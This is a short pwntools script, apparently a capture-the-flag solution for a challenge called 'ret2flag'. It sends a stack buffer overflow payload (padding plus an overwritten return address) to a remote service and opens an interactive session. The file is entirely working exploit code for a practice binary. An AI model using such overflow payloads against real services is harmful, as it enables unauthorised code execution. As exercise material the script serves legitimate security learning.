from pwn import *

# p = process("./ret2flag")
# gdb.attach(p)

p = remote("10.212.138.23", 29225)

payload = b"A" * 0x28 + p64(0x4012d4)

p.recvuntil(b"name:")
p.sendline(payload)

p.interactive()